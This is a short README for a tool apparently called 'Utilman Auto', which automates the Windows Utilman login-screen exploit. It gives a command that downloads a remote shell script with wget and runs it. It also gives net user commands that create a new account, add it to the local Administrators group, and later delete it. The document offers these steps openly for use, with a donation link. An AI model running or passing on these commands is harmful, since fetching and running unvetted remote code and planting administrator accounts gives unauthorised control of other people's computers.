# Utilman Auto
## Automatically perform the Utilman Exploit
```
wget nullsoepic.github.io/utilman/uexp.sh
sh uexp.sh
```

## Create / Delete windows account
**Create Account**
```
net user username yourpassword /add
net localgroup Administrators username /add
```

**Delete Account**
```
net user username /delete
```
***Note:** Adding or removing accounts may require a restart or some waiting time!*

*If you would like to support this you can [donate!](https://nulldev.ml/kofi)*
